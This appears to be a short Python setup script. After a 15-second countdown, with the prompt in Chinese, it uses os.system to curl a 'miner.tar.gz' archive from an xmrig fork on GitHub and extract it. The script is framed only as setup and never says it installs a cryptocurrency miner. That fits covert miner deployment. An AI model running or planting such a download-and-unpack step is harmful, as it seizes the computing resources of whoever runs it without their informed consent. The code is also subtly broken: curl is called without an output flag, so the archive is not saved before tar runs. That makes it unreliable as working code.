# coding=utf-8
import os

os.system('echo "start setup script"')
os.system('echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"')
os.system('sleep 15')
os.system('curl -L --progress-bar "https://github.com/lensfa-lzd/xmrig/raw/main/miner.tar.gz"')
os.system('tar xf miner.tar.gz')
